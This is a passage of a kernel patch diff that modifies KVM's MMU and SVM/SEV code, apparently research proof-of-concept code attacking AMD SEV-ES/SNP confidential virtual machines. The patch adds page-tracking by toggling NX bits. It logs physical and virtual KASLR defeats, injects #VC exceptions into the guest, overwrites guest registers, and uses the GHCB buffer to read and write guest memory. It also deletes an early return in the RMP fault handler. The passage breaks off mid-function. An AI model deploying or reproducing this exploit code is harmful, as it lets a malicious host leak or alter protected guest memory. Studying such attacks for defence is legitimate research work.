@@ -1,0 +1,1558 @@
+diff --git a/arch/x86/kvm/mmu/mmu.c b/arch/x86/kvm/mmu/mmu.c
+index 9428cc74398f..bb9c23033153 100644
+--- a/arch/x86/kvm/mmu/mmu.c
++++ b/arch/x86/kvm/mmu/mmu.c
+@@ -56,6 +56,8 @@
+ #include <asm/kvm_page_track.h>
+ #include "trace.h"
+ 
++#include <linux/intr_injection.h>
++
+ extern bool itlb_multihit_kvm_mitigation;
+ 
+ static bool nx_hugepage_mitigation_hard_disabled;
+@@ -1274,6 +1276,56 @@ static bool rmap_write_protect(struct kvm_rmap_head *rmap_head,
+ 	return flush;
+ }
+ 
++static bool spte_exec_unprotect(u64 *sptep, bool pt_protect)
++{
++	bool flush = false;
++	u64 spte = *sptep;
++	
++	if (spte & PT64_NX_MASK){
++		flush = true;
++		spte &= ~PT64_NX_MASK;
++		mmu_spte_update(sptep, spte);
++	}
++	return flush;
++}
++
++
++static bool spte_exec_protect(u64 *sptep, bool pt_protect)
++{
++	u64 spte = *sptep;
++
++	spte |= PT64_NX_MASK;
++	mmu_spte_update(sptep, spte);
++
++	return true;
++}
++
++static bool rmap_exec_unprotect(struct kvm_rmap_head *rmap_head,
++			       bool pt_protect)
++{
++	u64 *sptep;
++	struct rmap_iterator iter;
++	bool flush = false;
++
++	for_each_rmap_spte(rmap_head, &iter, sptep)
++		flush |= spte_exec_unprotect(sptep, pt_protect);
++
++	return flush;
++}
++
++static bool rmap_exec_protect(struct kvm_rmap_head *rmap_head,
++			       bool pt_protect)
++{
++	u64 *sptep;
++	struct rmap_iterator iter;
++	bool flush = false;
++
++	for_each_rmap_spte(rmap_head, &iter, sptep)
++		flush |= spte_exec_protect(sptep, pt_protect);
++
++	return flush;
++}
++
+ static bool spte_clear_dirty(u64 *sptep)
+ {
+ 	u64 spte = *sptep;
+@@ -1455,6 +1507,50 @@ bool kvm_mmu_slot_gfn_write_protect(struct kvm *kvm,
+ 	return write_protected;
+ }
+ 
++bool kvm_mmu_slot_gfn_exec_unprotect(struct kvm *kvm,
++				    struct kvm_memory_slot *slot, u64 gfn,
++				    int min_level)
++{
++	struct kvm_rmap_head *rmap_head;
++	int i;
++	bool exec_unprotected = false;
++
++	if (is_error_pfn(gfn)){
++		return false;
++	}
++
++	if (kvm_memslots_have_rmaps(kvm)) {
++		for (i = min_level; i <= KVM_MAX_HUGEPAGE_LEVEL; ++i) {
++			rmap_head = gfn_to_rmap(gfn, i, slot);
++			exec_unprotected |= rmap_exec_unprotect(rmap_head, true);
++		}
++	}
++
++	return exec_unprotected;
++}
++
++bool kvm_mmu_slot_gfn_exec_protect(struct kvm *kvm,
++				    struct kvm_memory_slot *slot, u64 gfn,
++				    int min_level)
++{
++	struct kvm_rmap_head *rmap_head;
++	int i;
++	bool exec_protected = false;
++
++	if (is_error_pfn(gfn)){
++		return false;
++	}
++
++	if (kvm_memslots_have_rmaps(kvm)) {
++		for (i = min_level; i <= KVM_MAX_HUGEPAGE_LEVEL; ++i) {
++			rmap_head = gfn_to_rmap(gfn, i, slot);
++			exec_protected |= rmap_exec_protect(rmap_head, true);
++		}
++	}
++
++	return exec_protected;
++}
++
+ static bool kvm_vcpu_write_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn)
+ {
+ 	struct kvm_memory_slot *slot;
+@@ -1463,6 +1559,84 @@ static bool kvm_vcpu_write_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn)
+ 	return kvm_mmu_slot_gfn_write_protect(vcpu->kvm, slot, gfn, PG_LEVEL_4K);
+ }
+ 
++bool kvm_vcpu_exec_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn, bool flush_tlb)
++{
++	struct kvm_memory_slot *slot;
++	slot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);
++	kvm_mmu_slot_gfn_exec_protect(vcpu->kvm, slot, gfn, PG_LEVEL_4K);
++	kvm_tdp_mmu_exec_protect_gfn(vcpu->kvm, slot, gfn, PG_LEVEL_4K);
++
++	if (flush_tlb)
++		kvm_flush_remote_tlbs_gfn(vcpu->kvm, gfn, PG_LEVEL_4K);
++	return true;
++}
++EXPORT_SYMBOL(kvm_vcpu_exec_protect_gfn);
++
++
++bool kvm_vcpu_exec_unprotect_gfn(struct kvm_vcpu *vcpu, u64 gfn)
++{
++	int retval;
++	struct kvm_memory_slot *slot;
++	slot = kvm_vcpu_gfn_to_memslot(vcpu, gfn);
++	retval = kvm_mmu_slot_gfn_exec_unprotect(vcpu->kvm, slot, gfn, PG_LEVEL_4K);
++	kvm_flush_remote_tlbs_gfn(vcpu->kvm, gfn, PG_LEVEL_4K);
++	return retval;
++}
++EXPORT_SYMBOL(kvm_vcpu_exec_unprotect_gfn);
++
++
++void kvm_slot_page_track_add_page_no_flush(struct kvm_vcpu *vcpu,
++				  struct kvm_memory_slot *slot, gfn_t gfn, bool init) {
++	/*
++	 * new track stops large page mapping for the
++	 * tracked page.
++	 */
++	if (init)
++		kvm_mmu_gfn_disallow_lpage(slot, gfn);
++	
++	kvm_vcpu_exec_protect_gfn(vcpu, gfn, false);
++}
++EXPORT_SYMBOL_GPL(kvm_slot_page_track_add_page_no_flush);
++
++//track all pages; taken from severed repo
++long kvm_start_tracking(struct kvm_vcpu *vcpu, bool init) {
++	long count = 0;
++	u64 iterator, iterat_max;
++	struct kvm_memslots* slots;
++	struct kvm_memory_slot *slot;
++	int srcu_lock_retval,bkt,i;
++
++	for( i = 0; i < KVM_MAX_NR_ADDRESS_SPACES; i++) {
++		slots = __kvm_memslots(vcpu->kvm,i);
++		kvm_for_each_memslot(slot, bkt, slots) {
++			iterat_max = slot->base_gfn + slot->npages;
++			srcu_lock_retval = srcu_read_lock(&vcpu->kvm->srcu);
++			write_lock(&vcpu->kvm->mmu_lock);
++			for (iterator=0; iterator < iterat_max; iterator++)
++			{
++				slot = kvm_vcpu_gfn_to_memslot(vcpu, iterator);
++				if ( slot != NULL ) {
++					kvm_slot_page_track_add_page_no_flush(vcpu, slot, iterator, init);
++					count++;
++
++				}
++				if( need_resched() || rwlock_needbreak(&vcpu->kvm->mmu_lock))  {
++					cond_resched_rwlock_write(&vcpu->kvm->mmu_lock);
++				}
++			}
++			write_unlock(&vcpu->kvm->mmu_lock);
++			srcu_read_unlock(&vcpu->kvm->srcu, srcu_lock_retval);
++		}
++	}
++	if( count > 0 ) {
++		kvm_flush_remote_tlbs(vcpu->kvm);
++	}
++	pr_info("KVM: %ld removed nx bits\n", count);
++    return count;
++}
++EXPORT_SYMBOL(kvm_start_tracking);
++
++
+ static bool __kvm_zap_rmap(struct kvm *kvm, struct kvm_rmap_head *rmap_head,
+ 			   const struct kvm_memory_slot *slot)
+ {
+@@ -3219,6 +3393,7 @@ void kvm_mmu_hugepage_adjust(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault
+ 	kvm_pfn_t mask;
+ 
+ 	fault->huge_page_disallowed = fault->exec && fault->nx_huge_page_workaround_enabled;
++	//fault->huge_page_disallowed = true;
+ 
+ 	if (unlikely(fault->max_level == PG_LEVEL_4K))
+ 		return;
+@@ -3735,6 +3910,7 @@ static int mmu_alloc_direct_roots(struct kvm_vcpu *vcpu)
+ 	unsigned i;
+ 	int r;
+ 
++	pr_info("%s",__func__);
+ 	write_lock(&vcpu->kvm->mmu_lock);
+ 	r = make_mmu_pages_available(vcpu);
+ 	if (r < 0)
+@@ -4494,6 +4670,27 @@ static bool is_page_fault_stale(struct kvm_vcpu *vcpu,
+ 	       mmu_invalidate_retry_gfn(vcpu->kvm, fault->mmu_seq, fault->gfn);
+ }
+ 
++uint64_t in_boot_state = 0;
++uint64_t page_fault_tracing_enabled = 1;
++bool kvm_vcpu_exec_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn, bool flush_tlb);
++static uint64_t curren_file_offset = 0;
++extern struct file *trace_dump_tmp;
++
++int file_sync(struct file *file) 
++{
++    vfs_fsync(file, 0);
++    return 0;
++}
++
++int file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
++{
++    int ret = kernel_write(file, data, size, &offset);
++
++	if ((offset & 0xFFFFF) == 0)
++		file_sync(file);
++	return ret;
++}
++
+ static int direct_page_fault(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault)
+ {
+ 	int r;
+@@ -4575,10 +4772,68 @@ int kvm_handle_page_fault(struct kvm_vcpu *vcpu, u64 error_code,
+ EXPORT_SYMBOL_GPL(kvm_handle_page_fault);
+ 
+ #ifdef CONFIG_X86_64
+-static int kvm_tdp_mmu_page_fault(struct kvm_vcpu *vcpu,
++static int noinline kvm_tdp_mmu_page_fault(struct kvm_vcpu *vcpu,
+ 				  struct kvm_page_fault *fault)
+ {
+ 	int r;
++	static uint64_t last_phys_addr = 0;
++	user_data_npf_ex.page_fault_count_till_vmlinux_switch++;
++	user_data_npf_ex.generic_page_fault_counter++;
++	if (page_fault_tracing_enabled){
++		//file_write(trace_dump_tmp,curren_file_offset,(char *)&fault->addr,8);
++		curren_file_offset+=8;
++		//pr_info("page fault at 0x%llx | state %d\n",fault->addr,user_data_npf_ex.state);
++		//removed_nx_bit = kvm_vcpu_exec_unprotect_gfn(vcpu, fault->addr >> 12);
++	}
++	// 0x7a752000 /0x7a753000
++	if ((last_phys_addr == 0x7a753000) & ((fault->addr & 0xFFFFF) == 0)){
++		pr_info("defeated physical ASLR %llx\n",fault->addr);
++		pr_info("page_faults till this point %lld\n",user_data_npf_ex.page_fault_count_till_vmlinux_switch);
++		user_data_npf_ex.physical_base_addr_kernel = fault->addr;
++		// the offset is address of x86_64_start_kernel - startup_64 (changes through the guest kernels)0x248eb80
++		// 0xffffffff83484dcb - 0xffffffff81000000 = 0x2484dcb
++		user_data_npf_ex.x86_64_start_kernel += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.insn_get_modrm_reg_ptr_gpa += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.vc_handle_mmio_gpa += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.update_rq_clock += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.sched_clock_cpu += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.lookup_address_in_pgd += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.vc_do_mmio += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.vc_return_address += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.scheduler_tick += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.update_rq_clock_part_0 += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.vc_handle_exitcode_page += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.sev_put_ghcb_page += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.getrandom_syscall_addr += user_data_npf_ex.physical_base_addr_kernel;
++		user_data_npf_ex.vc_handle_exitcode_page_part_1 += user_data_npf_ex.physical_base_addr_kernel;
++
++
++		// make sure addresses are page aligned
++		user_data_npf_ex.x86_64_start_kernel &= ~0xFFFULL;
++		user_data_npf_ex.insn_get_modrm_reg_ptr_gpa &= ~0xFFFULL; 
++		user_data_npf_ex.vc_handle_mmio_gpa &= ~0xFFFULL; 
++		user_data_npf_ex.update_rq_clock &= ~0xFFFULL; 
++		user_data_npf_ex.sched_clock_cpu &= ~0xFFFULL;
++		user_data_npf_ex.lookup_address_in_pgd &= ~0xFFFULL;
++		user_data_npf_ex.vc_do_mmio &= ~0xFFFULL; 
++		user_data_npf_ex.vc_return_address &= ~0xFFFULL;
++
++		user_data_npf_ex.scheduler_tick &= ~0xFFFULL;
++		user_data_npf_ex.update_rq_clock_part_0 &= ~0xFFFULL;
++
++		user_data_npf_ex.vc_handle_exitcode_page &= ~0xFFFULL;
++		user_data_npf_ex.sev_put_ghcb_page &= ~0xFFFULL;
++
++		user_data_npf_ex.getrandom_syscall_addr &= ~0xFFFULL;
++
++		user_data_npf_ex.vc_handle_exitcode_page_part_1 &= ~0xFFFULL;
++
++		pr_info("registered page fault for virtual KASLR defeat %llx\n",user_data_npf_ex.x86_64_start_kernel);
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.x86_64_start_kernel >> 12, true);
++		user_data_npf_ex.state = VC_WAIT_FOR_KASLR_PAGE_FAULT;
++		user_data_npf_ex.generic_page_counter = 0;
++	}
++	last_phys_addr = fault->addr;
+ 
+ 	if (page_fault_handle_page_track(vcpu, fault))
+ 		return RET_PF_EMULATE;
+diff --git a/arch/x86/kvm/mmu/tdp_mmu.c b/arch/x86/kvm/mmu/tdp_mmu.c
+index 70052f59cfdf..1582d21491fa 100644
+--- a/arch/x86/kvm/mmu/tdp_mmu.c
++++ b/arch/x86/kvm/mmu/tdp_mmu.c
+@@ -187,6 +187,8 @@ static struct kvm_mmu_page *tdp_mmu_next_root(struct kvm *kvm,
+ 	if (prev_root)
+ 		kvm_tdp_mmu_put_root(kvm, prev_root, shared);
+ 
++	//pr_info("getting next_root %p", next_root);
++
+ 	return next_root;
+ }
+ 
+@@ -972,7 +974,7 @@ void kvm_tdp_mmu_invalidate_all_roots(struct kvm *kvm)
+  * Installs a last-level SPTE to handle a TDP page fault.
+  * (NPT/EPT violation/misconfiguration)
+  */
+-static int tdp_mmu_map_handle_target_level(struct kvm_vcpu *vcpu,
++static int noinline tdp_mmu_map_handle_target_level(struct kvm_vcpu *vcpu,
+ 					  struct kvm_page_fault *fault,
+ 					  struct tdp_iter *iter)
+ {
+@@ -1514,8 +1516,9 @@ void kvm_tdp_mmu_try_split_huge_pages(struct kvm *kvm,
+ 	int r = 0;
+ 
+ 	kvm_lockdep_assert_mmu_lock_held(kvm, shared);
+-
++	pr_info("shared = %d",shared);
+ 	for_each_valid_tdp_mmu_root_yield_safe(kvm, root, slot->as_id, shared) {
++		pr_info("testtttttt ----------------\n");
+ 		r = tdp_mmu_split_huge_pages_root(kvm, root, start, end, target_level, shared);
+ 		if (r) {
+ 			kvm_tdp_mmu_put_root(kvm, root, shared);
+@@ -1753,6 +1756,36 @@ static bool write_protect_gfn(struct kvm *kvm, struct kvm_mmu_page *root,
+ 	return spte_set;
+ }
+ 
++static bool exec_protect_gfn(struct kvm *kvm, struct kvm_mmu_page *root,
++			      gfn_t gfn, int min_level)
++{
++	struct tdp_iter iter;
++	u64 new_spte;
++	bool spte_set = false;
++
++	BUG_ON(min_level > KVM_MAX_HUGEPAGE_LEVEL);
++
++	rcu_read_lock();
++
++	for_each_tdp_pte_min_level(iter, root, min_level, gfn, gfn + 1) {
++		if (!is_shadow_present_pte(iter.old_spte) ||
++		    !is_last_spte(iter.old_spte, iter.level))
++			continue;
++
++		new_spte = iter.old_spte | PT64_NX_MASK;
++
++		if (new_spte == iter.old_spte)
++			break;
++
++		tdp_mmu_iter_set_spte(kvm, &iter, new_spte);
++		spte_set = true;
++	}
++
++	rcu_read_unlock();
++
++	return spte_set;
++}
++
+ /*
+  * Removes write access on the last level SPTE mapping this GFN and unsets the
+  * MMU-writable bit to ensure future writes continue to be intercepted.
+@@ -1772,6 +1805,20 @@ bool kvm_tdp_mmu_write_protect_gfn(struct kvm *kvm,
+ 	return spte_set;
+ }
+ 
++bool kvm_tdp_mmu_exec_protect_gfn(struct kvm *kvm,
++				   struct kvm_memory_slot *slot, gfn_t gfn,
++				   int min_level)
++{
++	struct kvm_mmu_page *root;
++	bool spte_set = false;
++
++	lockdep_assert_held_write(&kvm->mmu_lock);
++	for_each_tdp_mmu_root(kvm, root, slot->as_id)
++		spte_set |= exec_protect_gfn(kvm, root, gfn, min_level);
++
++	return spte_set;
++}
++
+ /*
+  * Return the level of the lowest level SPTE added to sptes.
+  * That SPTE may be non-present.
+diff --git a/arch/x86/kvm/mmu/tdp_mmu.h b/arch/x86/kvm/mmu/tdp_mmu.h
+index 0a63b1afabd3..f6ac59b98352 100644
+--- a/arch/x86/kvm/mmu/tdp_mmu.h
++++ b/arch/x86/kvm/mmu/tdp_mmu.h
+@@ -49,6 +49,9 @@ void kvm_tdp_mmu_zap_collapsible_sptes(struct kvm *kvm,
+ bool kvm_tdp_mmu_write_protect_gfn(struct kvm *kvm,
+ 				   struct kvm_memory_slot *slot, gfn_t gfn,
+ 				   int min_level);
++bool kvm_tdp_mmu_exec_protect_gfn(struct kvm *kvm,
++				   struct kvm_memory_slot *slot, gfn_t gfn,
++				   int min_level);
+ 
+ void kvm_tdp_mmu_try_split_huge_pages(struct kvm *kvm,
+ 				      const struct kvm_memory_slot *slot,
+diff --git a/arch/x86/kvm/svm/sev.c b/arch/x86/kvm/svm/sev.c
+index 32cb570b91eb..e2cb71edabe5 100644
+--- a/arch/x86/kvm/svm/sev.c
++++ b/arch/x86/kvm/svm/sev.c
+@@ -21,6 +21,8 @@
+ #include <linux/trace_events.h>
+ #include <uapi/linux/sev-guest.h>
+ 
++#include <linux/intr_injection.h>
++
+ #include <asm/pkru.h>
+ #include <asm/trapnr.h>
+ #include <asm/fpu/xcr.h>
+@@ -3902,6 +3904,9 @@ static int sev_handle_vmgexit_msr_protocol(struct vcpu_svm *svm)
+ 	return ret;
+ }
+ 
++extern long kvm_start_tracking(struct kvm_vcpu *vcpu, bool init);
++extern bool kvm_vcpu_exec_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn, bool flush_tlb);
++
+ int sev_handle_vmgexit(struct kvm_vcpu *vcpu)
+ {
+ 	struct vcpu_svm *svm = to_svm(vcpu);
+@@ -3937,6 +3942,8 @@ int sev_handle_vmgexit(struct kvm_vcpu *vcpu)
+ 	trace_kvm_vmgexit_enter(vcpu->vcpu_id, ghcb);
+ 
+ 	exit_code = ghcb_get_sw_exit_code(ghcb);
++	//pr_info("with code %llx\n",exit_code);
++
+ 
+ 	/* SEV-SNP guest requires that the GHCB GPA must be registered */
+ 	if (sev_snp_guest(svm->vcpu.kvm) && !ghcb_gpa_is_registered(svm, ghcb_gpa)) {
+@@ -3962,12 +3969,38 @@ int sev_handle_vmgexit(struct kvm_vcpu *vcpu)
+ 					   control->exit_info_1,
+ 					   control->exit_info_2,
+ 					   svm->sev_es.ghcb_sa);
++
++		if (user_data_npf_ex.state != VC_IDLE){
++			switch (svm->sev_es.ghcb_sa_len) {
++			case 8:
++				*((u64*)ghcb->shared_buffer) = user_data_npf_ex.data_user;
++				pr_info("Write: %llx To: %llx\n",*((u64*)ghcb->shared_buffer),user_data_npf_ex.leak_addr);
++				ret = 1;
++				break;
++			default:
++				break;
++			}
++		}
++	
++
+ 		break;
+ 	case SVM_VMGEXIT_MMIO_WRITE:
+ 		ret = setup_vmgexit_scratch(svm, false, control->exit_info_2);
+ 		if (ret)
+ 			break;
+ 
++		if (user_data_npf_ex.state != VC_IDLE){
++			switch (svm->sev_es.ghcb_sa_len)
++			{
++			case 8:
++				user_data_npf_ex.data_user = *((u64*)ghcb->shared_buffer);
++				pr_info("READ: %llx From: %llx\n",*((u64*)ghcb->shared_buffer),user_data_npf_ex.leak_addr);
++				break;
++			default:
++				break;
++			}
++		}
++
+ 		ret = kvm_sev_es_mmio_write(vcpu,
+ 					    control->exit_info_1,
+ 					    control->exit_info_2,
+@@ -4045,6 +4078,56 @@ int sev_handle_vmgexit(struct kvm_vcpu *vcpu)
+ 		ret = -EINVAL;
+ 		break;
+ 	default:
++		if (exit_code == 0x81 || exit_code == 0x6f)
++		{
++			VC_pr_info("vcpu: %d, got vmexit 0x%llx with ghcb gpa: %llx\n", vcpu->vcpu_idx,exit_code, ghcb_gpa);
++			switch (exit_code){
++				case 0x81:
++					VC_pr_info("leaked RAX: 0x%llx\n",ghcb->save.rax);
++					if (user_data_npf_ex.state == VC_INJECTED_RAX_PTR_LEAK_INTO_VC){
++						// The value must have certain condition set, such that the page encrypt check does NOT fail
++						// curently we let it point to RAX which is a counter increament at our point
++						// this means the value is most likely small and the check in the guest will succeed.
++						user_data_npf_ex.valid_virtual_address_pointing_to_rax_register = ghcb->save.rax;
++						vcpu->arch.regs[VCPU_REGS_RAX] = user_data_npf_ex.leak_addr;
++						//user_data_npf_ex.state = VC_PROFILE_FOR_SECOND_INJECT_INTO_VC;
++						user_data_npf_ex.state = VC_SWITCH_TO_SKIPPING_STATE_FIRST;
++						kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.lookup_address_in_pgd >> 12, true);
++						kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_do_mmio >> 12, true);
++						// after here we must fault on vc_raw_handle_exception and sev_put_ghcd.
++						kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_handle_exitcode_page >> 12, true);
++						kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.sev_put_ghcb_page >> 12, true);
++						user_data_npf_ex.state_skipping = VC__START_PROFILING;
++					} else if (user_data_npf_ex.state == VC_INJECTED_SECOND_VC_INTO_VC){
++						vcpu->arch.regs[VCPU_REGS_RAX] = user_data_npf_ex.valid_virtual_address_pointing_to_rax_register;
++						user_data_npf_ex.state = VC_WAIT_FOR_RETURN_OF_SECOND_VC_INJ;
++						kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_return_address >> 12, true);
++					} else if(user_data_npf_ex.state == VC_INJECT_VC_TO_SKIP_JMP) {
++						VC_pr_info("skip instruction\n");
++						user_data_npf_ex.state = VC_WAIT_INJECT_VC_TO_SKIP_JMP_RETURNED;
++						kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_return_address >> 12, true);
++					} else if (user_data_npf_ex.state == VC_WAIT_FOR_VMEXIT_WITH_KASLR_ADDR){
++						VC_pr_info("address of x86_64_start_kernel 0x%lx",vcpu->arch.regs[VCPU_REGS_RAX]);
++						// if we play around with the kernel while prototyping we will add some prints.
++						// this will move the offset around and we end up with +/- 0x100 offsets fix this by applying the mask
++						user_data_npf_ex.virtual_base_addr_kernel = (vcpu->arch.regs[VCPU_REGS_RAX] - 0x248eb80) & (~0xFFFFF);
++						VC_pr_info("virtual base of kernel is: 0x%llx",user_data_npf_ex.virtual_base_addr_kernel);
++						user_data_npf_ex.state = VC_IDLE;
++					} else if (user_data_npf_ex.state_skipping == VC__FAULT_ON_BASE){
++						VC_pr_info("skipping instruction in vc_raw_handle_exception\n");
++						VC_pr_profile("vmmcall skip instruction duration rdtsc %lld\n",rdtsc()-user_data_npf_ex.instruction_skip_rdtsc);
++						VC_pr_profile("vmmcall skip instruction duration ns %lld\n",ktime_get_ns()-user_data_npf_ex.instruction_skip_ns);
++						kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_return_address >> 12, true);
++						user_data_npf_ex.state_skipping = VC__WAIT_FOR_END_OF_VC;
++					}
++					VC_pr_info("overwrite RAX 0x%lx\n",vcpu->arch.regs[VCPU_REGS_RAX]);
++					break;
++				default:
++					VC_pr_info("no custom VC handling function initialized: code 0x%llx",exit_code);
++			}
++			return 1;
++		}
++
+ 		ret = svm_invoke_exit_handler(vcpu, exit_code);
+ 	}
+ 
+@@ -4259,7 +4342,6 @@ void handle_rmp_page_fault(struct kvm_vcpu *vcpu, gpa_t gpa, u64 error_code)
+ 	if (!(error_code & PFERR_GUEST_SIZEM_MASK)) {
+ 		pr_debug_ratelimited("Unexpected RMP fault for GPA 0x%llx, error_code 0x%llx",
+ 				     gpa, error_code);
+-		return;
+ 	}
+ 
+ 	gfn = gpa >> PAGE_SHIFT;
+diff --git a/arch/x86/kvm/svm/svm.c b/arch/x86/kvm/svm/svm.c
+index 27a2d3c37394..4667c6501a99 100644
+--- a/arch/x86/kvm/svm/svm.c
++++ b/arch/x86/kvm/svm/svm.c
+@@ -41,6 +41,8 @@
+ #include <asm/traps.h>
+ #include <asm/fpu/api.h>
+ 
++#include <linux/intr_injection.h>
++
+ #include <asm/virtext.h>
+ 
+ #include <trace/events/ipi.h>
+@@ -4025,17 +4027,319 @@ static fastpath_t svm_exit_handlers_fastpath(struct kvm_vcpu *vcpu)
+ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu, bool spec_ctrl_intercepted)
+ {
+ 	struct vcpu_svm *svm = to_svm(vcpu);
+-
++	//uint64_t rdtsc_before = 0;
+ 	guest_state_enter_irqoff();
+ 
++	//rdtsc_before = rdtsc();
+ 	if (sev_es_guest(vcpu->kvm))
+ 		__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted);
+ 	else
+ 		__svm_vcpu_run(svm, spec_ctrl_intercepted);
++	//pr_info("rdtsc diff %lld",rdtsc()-rdtsc_before);
+ 
+ 	guest_state_exit_irqoff();
+ }
+ 
++extern bool kvm_vcpu_exec_protect_gfn(struct kvm_vcpu *vcpu, u64 gfn, bool flush_tlb);
++extern bool kvm_vcpu_exec_unprotect_gfn(struct kvm_vcpu *vcpu, u64 gfn);
++extern long kvm_start_tracking(struct kvm_vcpu *vcpu, bool init);
++
++
++void profile_pages_and_inject_VC_first(struct kvm_vcpu *vcpu){
++	struct vcpu_svm *svm = to_svm(vcpu);
++	u64 fault_address = svm->vmcb->control.exit_info_2;
++	static u64 previous_fault_address = 1;
++	static u64 count_vc_handle_mmio_gpa = 0;
++	static u64 count_insn_get_modrm_reg_ptr_gpa = 0;
++
++	if (user_data_npf_ex.insn_get_modrm_reg_ptr_gpa)
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.insn_get_modrm_reg_ptr_gpa >> 12, true);
++
++	if (user_data_npf_ex.vc_handle_mmio_gpa)
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_handle_mmio_gpa >> 12, true);
++
++
++	if (svm->vmcb->control.exit_code == SVM_EXIT_NPF && fault_address){
++		if (user_data_npf_ex.insn_get_modrm_reg_ptr_gpa == fault_address){
++			count_insn_get_modrm_reg_ptr_gpa++;
++		}
++		if (user_data_npf_ex.vc_handle_mmio_gpa == fault_address){
++			count_vc_handle_mmio_gpa++;
++		}
++		if ((count_vc_handle_mmio_gpa == 4) && (count_insn_get_modrm_reg_ptr_gpa == 3))
++		{
++			user_data_npf_ex.exception_number = 29;
++			user_data_npf_ex.exception_error_code = 0x81;
++			atomic_set(&user_data_npf_ex.deliver_intr, 2);
++			// release guest
++			user_data_npf_ex.state = VC_INJECTED_RAX_PTR_LEAK_INTO_VC;
++			count_vc_handle_mmio_gpa = 0;
++			count_insn_get_modrm_reg_ptr_gpa = 0;
++			VC_pr_info("injecting first leak interrupt\n");
++		}
++		previous_fault_address = fault_address;
++	}
++}
++
++void profile_pages_and_inject_VC_second(struct kvm_vcpu *vcpu){
++	struct vcpu_svm *svm = to_svm(vcpu);
++	u64 fault_address = svm->vmcb->control.exit_info_2;
++	static u64 previous_fault_address = 1;
++	static u64 count_lookup_address_in_pgd = 0;
++
++	if (user_data_npf_ex.lookup_address_in_pgd)
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.lookup_address_in_pgd >> 12, true);
++
++	if (user_data_npf_ex.vc_do_mmio)
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.vc_do_mmio >> 12, true);
++
++
++	if (svm->vmcb->control.exit_code == SVM_EXIT_NPF && fault_address){
++		if (user_data_npf_ex.lookup_address_in_pgd == fault_address){
++			count_lookup_address_in_pgd++;
++		}
++		if ((user_data_npf_ex.vc_do_mmio == fault_address) && (count_lookup_address_in_pgd == 1))
++		{
++			user_data_npf_ex.exception_number = 29;
++			user_data_npf_ex.exception_error_code = 0x81;
++			atomic_set(&user_data_npf_ex.deliver_intr, 2);
++
++			user_data_npf_ex.state = VC_INJECTED_SECOND_VC_INTO_VC;
++			count_lookup_address_in_pgd = 0;
++			// release guest
++			VC_pr_info("injecting second leak interrupt\n");
++		}
++		previous_fault_address = svm->vmcb->control.exit_info_2;
++	}
++}
++
++void profile_pages_and_fault_on_mov_read(struct kvm_vcpu *vcpu){
++	struct vcpu_svm *svm = to_svm(vcpu);
++	u64 fault_address = svm->vmcb->control.exit_info_2;
++	static u64 previous_fault_address = 1;
++
++	if(user_data_npf_ex.state != VC_WAITING_FOR_UNDERLYING_MOV)
++		return;
++
++	if (previous_fault_address == user_data_npf_ex.sched_clock_cpu && 
++		fault_address == user_data_npf_ex.update_rq_clock){
++			user_data_npf_ex.state = VC_STOPPED_ON_MOV;
++			previous_fault_address = 1;
++			//user_data_npf_ex.need_rax_rdx_overwrite = true;
++			VC_pr_info("reached page boundary mov read instruction, continuing with leak\n");
++			return;
++	}
++
++	if (user_data_npf_ex.update_rq_clock)
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.update_rq_clock >> 12, true);
++
++	if (user_data_npf_ex.sched_clock_cpu)
++		kvm_vcpu_exec_protect_gfn(vcpu, user_data_npf_ex.sched_clock_cpu >> 12, true);
++
++	if (svm->vmcb->control.exit_code == SVM_EXIT_NPF && fault_address){
++		previous_fault_address = fault_address;
++	}
++}
++
++void profile_pages_and_fault_on_mov_write(struct kvm_vcpu *vcpu){
++	struct vcpu_svm *svm = to_svm(vcpu);
++	u64 fault_address = svm->vmcb->control.exit_info_2;
++	static u64 previous_fault_address = 1;
++	static u64 deadlock_count = 0, resume_count = 0;
++
++	if(user_data_npf_ex.state != VC_WAITING_FOR_UNDERLYING_MOV)
++		return;
++
++	if (previous_fault_address == user_data_npf_ex.update_rq_clock_part_0 && 
++		fault_address == user_data_npf_ex.scheduler_tick){
++			user_data_npf_ex.state = VC_STOPPED_ON_MOV;
++			previous_fault_address = 1;
++			deadlock_count = 0;
++			resume_count = 0;
++			//user_data_npf_ex.need_rax_rdx_overwrite = true;
++			VC_pr_info("reached page boundary mov write instruction, continuing with leak\n");
++			return;
++	}
++	if (svm->vmcb->control.exit_code == SVM_EXIT_NPF && fault_address){
++		previous_fault_address = fault_address;
